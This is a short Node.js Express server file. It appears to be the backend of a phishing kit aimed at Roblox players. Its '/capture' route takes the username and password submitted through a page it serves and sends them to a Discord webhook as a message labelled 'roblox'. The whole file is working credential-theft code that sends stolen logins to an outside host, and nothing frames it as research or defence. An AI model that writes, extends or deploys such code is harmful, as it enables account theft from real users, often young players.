// server.js
const express = require("express");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("."));

const webhook = process.env.DISCORD_WEBHOOK;

app.post("/capture", async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    const safeUser = typeof username === "string" ? username : "";
    const safePass = typeof password === "string" ? password : "";

    if (!safeUser || !safePass) {
        return res.status(400).json({ error: "missing" });
    }

    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `roblox\nuser: ${safeUser}\npass: ${safePass}`
            })
        });
    } catch (error) {
        console.error(error);
    }

    res.json({ status: "ok" });
});

app.listen(process.env.PORT || 3000, () => {
    console.log("server started");
});
